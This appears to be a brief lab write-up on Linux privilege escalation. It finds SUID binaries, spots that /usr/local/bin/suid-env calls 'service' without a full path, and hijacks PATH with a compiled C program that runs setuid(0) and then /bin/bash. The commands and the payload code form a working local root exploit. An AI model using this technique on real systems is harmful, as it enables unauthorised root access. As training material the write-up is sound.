# Detection

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

From the output make a note of all teh SUID binaries.

![image](https://user-images.githubusercontent.com/96658935/147711276-cb4174b8-e0a1-44bb-9033-59e9a9fa79a5.png)


```bash
strings /usr/local/bin/suid-env
```


![image](https://user-images.githubusercontent.com/96658935/147711310-9a96de3d-0af3-4668-b56b-d0f6d6a18460.png)


We see that it is caling the service command at the bottom

# Exploitation



```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```

![image](https://user-images.githubusercontent.com/96658935/147711430-dac9d946-7276-42ba-bcdb-2478529e1cdf.png)

created a /tmp folder and placed the c code in that file service.c

* compiled the code from service.c to service and changed the Path


![image](https://user-images.githubusercontent.com/96658935/147711490-d6d8e544-a133-4e50-805f-5a171c022e85.png)


